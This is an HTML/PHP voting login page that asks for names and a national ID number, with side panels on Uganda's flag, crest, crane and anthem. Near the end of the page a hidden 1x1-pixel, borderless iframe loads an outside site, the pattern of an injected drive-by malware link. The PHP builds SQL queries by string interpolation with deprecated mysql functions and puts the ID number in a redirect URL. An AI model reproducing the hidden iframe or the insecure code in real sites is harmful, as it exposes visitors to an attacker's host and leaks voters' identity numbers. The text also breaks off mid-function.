<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css" media="all">
img{ border:hidden;}
hover{ color:#999999; display:block}
body{color: #666666;style:inherit;border:thin,#000000;}
font{color: #00000;}
form{color:#00000;border:thick;}
input type{ border-color:#333333}
table{ background-color: #FFFFF;} 

</style>
<title></title>
<body bgcolor="#FFFFF">
 <fieldset>
<center><img src="1.jpg"></center><hr />

<hr> <table><tr>
<td><fieldset>
<form action="" method="post">
<font color="red"size=6><U>Cast your vote:</U></font></a><br><br><br>
<p>First Name:<br>
   <input type="text" value1="" name="firstName" placeholder="first name" required/>
   <br/>
   <br/>
</p>
 <p>Second Name : <br>
   <input type="text" value2="" name="givenName" placeholder="other name" required/>
   <br/>
   <br/>
National Id Number :<br>
   <input type="password" value3="" name="nin" placeholder="NIN" required/>
   <br/>
   <br/>
   <p style="color:#FF0000">
   <?php
   if(isset($_REQUEST['firstName'],$_REQUEST['givenName'],$_REQUEST['nin'])){
      include("connect.php");
	 
	if(isset($_POST['firstName'],$_POST['givenName'],$_POST['nin'])){
		$fname = mysql_real_escape_string(htmlentities($_POST['firstName']));
		$lname = mysql_real_escape_string(htmlentities($_POST['givenName']));
		$nin = mysql_real_escape_string(htmlentities($_POST['nin']));
		if(hasVoted($nin)){
		  echo "ACCESS DENIED:<br/>you already casted a vote!";
		 		}else{
		
		$sql = "select * from  voter where first_name = '$fname' and Given_name = '$lname' and nin = '$nin'";
		$result =  mysql_query($sql);
		$rowcount = mysql_num_rows($result);
	
		//echo "-------------------1 ".$rowcount.'<br/>';
		if($rowcount == 1){
			echo "Success full";
			//Location("header:dorcus.php");
			header("location:dorcus.php?nin=$nin&name=$fname $lname");
		}else{
			echo "ACCESS DENIED:<br/>invalid inputs!";
			//_SESSION['logstatus'] = "Wrong user name or password";
			//Location("header:index1.php");		
		}
		}
	}else{
		
		 echo "incomplete form";
		//_SESSION['logstatus'] = "incomplete form";
		//Location("header:index1.php");
	}

   }
   ?>
   </p>
   <input type="image" src="77.jpg" value="submit"/>
   <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
   
   
   </fieldset>
   </form>
</td> 
<td>
<fieldset>
<b>Ugandan National Symbols</b><br /><br /><hr /> 
<u>Flag of Uganda</u><br>
The flag of Uganda was adopted in 1962. The black color identifies Uganda as a black nation of Africa,
 the yellow represents the abundant sunshine Uganda enjoys being situated on the equator, and the red 
represents Uganda's brotherhood with the rest of Africa and the world. The crested crane, the national
bird of Uganda, adorns the center of the flag and stands on one leg facing 	 
the flag pole. The raised leg symbolizes that Uganda is not stationary but moving forward.<br><img src="5.jpg">
<br><br><hr>


 
 	<u>Official Crest of Uganda</u><br>
The official insignia (coat of arms) of Uganda reflects the identity, aspirations and economic activity 
of Uganda. The Crested Crane (Regulorum gibbericeps) includes all the national colors (black, yellow, and
 red) plus it is friendly, gentle, and peace loving, characteristics true of the Ugandan people. To the 
left is a Kob (Adenota kob Thomasi) which symbolizes the abundant wildlife found in Uganda. 
The spear and shield are traditional tools of defense in Africa. The sun represents the abundant sunshine
 found in Uganda as an equatorial nation. The drum is a symbol of the cultural heritage of the Ugandan
 people. The upper blue lines (top of shield) represent Uganda's abundant rainfall while the lower blue 
lines (under the shield) represent plentiful lakes and rivers. To the left see coffee growing and to the
 right cotton, both cash crops of Uganda with cotton being grown less today than in previous years. The 
motto For God and My Country reflects upon Uganda as a nation of people who fear God and love their country.<br>
<img src="88.jpg"><br><br><hr> 
 	<u>The Crested Crane</u><br>
(Regulorum gibbericeps)
Official Bird of Uganda  
The Crested Crane is the official bird of Uganda. In its plumage, it contains the three colors of Uganda
 (see flag info above)and is a friendly, gentle and peace loving bird, characteristics which are certainly
 true of the Ugandan people.<br>
<img src="4.jpg"><hr>
 
About Uganda | Uganda Mission Home</td></fieldset>
<td>
<fieldset>
<div id="me" style="float:left; padding:3px">
<iframe width="560" height="315" src="//www.youtube.com/embed/8RMGZH7GlTs" frameborder="0" allowfullscreen></iframe>
<center><b>Demarkation of the republic of Uganda:</b></center><br>

<hr><a href="https://maps.google.com/maps?q=Uganda&hl=en&sll=1.373333,32.290275&sspn=6.619156,10.821533&oq=+Uganda&t=h&hnear=Uganda&z=7"><iframe width="510" height="304" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q=Uganda&amp;aq=0&amp;oq=+Uganda&amp;sll=1.373333,32.290275&amp;sspn=6.619156,10.821533&amp;t=h&amp;ie=UTF8&amp;hq=&amp;hnear=Uganda&amp;z=7&amp;ll=1.373333,32.290275&amp;output=embed"></iframe><br /><small><a href="https://maps.google.com/maps?f=q&amp;source=embed&amp;hl=en&amp;geocode=&amp;q=Uganda&amp;aq=0&amp;oq=+Uganda&amp;sll=1.373333,32.290275&amp;sspn=6.619156,10.821533&amp;t=h&amp;ie=UTF8&amp;hq=&amp;hnear=Uganda&amp;z=7&amp;ll=1.373333,32.290275" style="color:#0000FF;text-align:left">View Larger Map</a></small></a><br /><br />

<u>Ugandan National Anthem </u><br>
Oh Uganda may God uphold thee,<br>
We lay our future in thy hand,<br>
United free for liberty<br>
Together we'll always stand.<br>
Oh Uganda the land of freedom,<br>
Our love and labour we give,<br>
And with neighbours all, <br>
At our country's call<br>
In peace and friendship we'll live.<br>

Oh Uganda! the land that feeds us,<br> 
By sun and fertile soil grown,<br>
For our own dear land,<br>
We shall always stand,<br>
The pearl of Africa's Crown <br>
from Social Studies Atlas for Uganda page 1, see Uganda Books<br /> 
About Uganda | Uganda Mission Home
<a href="Uganda-Abridged-Constitution-2006.pdf">Download the ugandan consititution</a>
<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div></fieldset></td>



</td></tr></table>
 <center>
  <font size="1"> The Electral commission &copy; copyright 1996</font> 
 </center>
</fieldset>

<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
<?php
function hasVoted($nin){
include("connect.php");
$sel=mysql_query("select * from poll where NIN='$nin'")or die(mysql_error());
$val=mysql_fe